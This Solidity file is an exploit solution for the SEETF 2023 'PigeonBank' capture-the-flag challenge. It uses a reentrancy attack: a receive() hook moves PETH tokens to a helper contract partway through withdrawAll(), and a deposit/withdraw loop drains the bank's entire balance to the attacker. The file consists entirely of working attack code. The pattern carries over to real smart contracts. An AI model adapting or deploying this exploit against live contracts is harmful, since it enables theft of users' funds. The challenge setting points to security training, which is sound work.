// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "src/SEETF_2023/PigeonBank/Setup.sol";

contract PigeonBankAttackHelper {
    function get(address _bank) public {
        PigeonBank bank = PigeonBank(payable(_bank));
        bank.withdrawAll();
        (bool success, ) = address(msg.sender).call{value: address(this).balance}("");
        require(success);    
    }

    receive() external payable {}
}

contract PigeonBankAttack {
    
    PigeonBank public bank;
    PETH public peth;
    address public attacker;
    PigeonBankAttackHelper public helper;

    function attack(address target) public payable {
        attacker = msg.sender;
        helper = new PigeonBankAttackHelper();

        bank = PigeonBank(payable(target));
        peth = bank.peth();
                
        while(peth.totalSupply() != 0) {
            uint256 v = address(this).balance <= peth.totalSupply() ? address(this).balance : peth.totalSupply();
            bank.deposit{value: v}();
            bank.withdrawAll();
            helper.get(address(bank));
            // this.balance += deposit value, 
        }

        (bool success, ) = attacker.call{value: address(this).balance}("");
        require(success);
    }

    receive() external payable {
        peth.transfer(address(helper), peth.balanceOf(address(this)));
    }

}
